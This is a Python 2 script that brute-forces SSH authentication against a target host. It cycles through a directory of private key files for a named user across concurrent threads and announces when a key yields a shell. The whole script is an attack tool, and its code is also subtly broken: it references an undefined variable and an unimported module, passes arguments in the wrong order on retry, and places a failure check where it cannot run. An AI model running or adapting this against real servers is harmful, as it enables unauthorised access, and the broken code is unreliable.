#!/usr/bin/python

import pexpect
import optparse
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0

def connect(host, user, keyfile, release):
	global Stop
	global Fails
	try:
		perm_denied = 'Permission Denied'
		ssh_newkey = 'Are you sure you want to continue'
		opt = ' -o PasswordAuthentication=no'

		connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt

		child = pexpect.spawn(connStr)
		ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '#', ])

		if (ret == 2):
			print '[-] Adding Host to ~/.ssh/known_hosts'
			child.sendline('yes')
			connect(user, host, keyfile, False)
		elif (ret == 3):
			print '[-] Connection Closed By Remote Host'
			Fails += 1
		elif (ret > 3):
			print '[+] Success. ' + str(keyfile)
			Stop = True
	finally:
		if release:
			connection_lock.release()

def main():
	parser = optparse.OptionParser('%prog -T <target host> -U <user> -K <directory of key files>')
	parser.add_option ('-T', dest='myHost', type='string', help='enter hostname or ip address')
	parser.add_option ('-U', dest='myUser', type='string', help='enter the specific user')
	parser.add_option ('-K', dest='myKeys', type='string', help='location of stored keys to bruteforce with')

	(options, args) = parser.parse_args()

	xHost = options.myHost
	xUser = options.myUser
	xKeys = options.myKeys

	if (xHost == None) | (xUser == None) | (xKeys == None):
		print "Missing arguments, please use --help"
		exit(0)

	for filename in os.listdir(xKeys):
		if Stop:
			print "[*] Exiting: Key Found"
			exit(0)
			if Fails > 5:
				print "[!] Exiting: Too Many Socket Timeouts"
				print "[!] Adjust number of simultaneous threads."
				exit(0)
		connection_lock.acquire()
		fullpath = os.path.join(xKeys, filename)
		print "[-] Testing keyfile " + str(fullpath)
		t = Thread(target=connect, args=(xHost, xUser, fullpath, True))
		child = t.start()

if __name__ == '__main__':
	main()
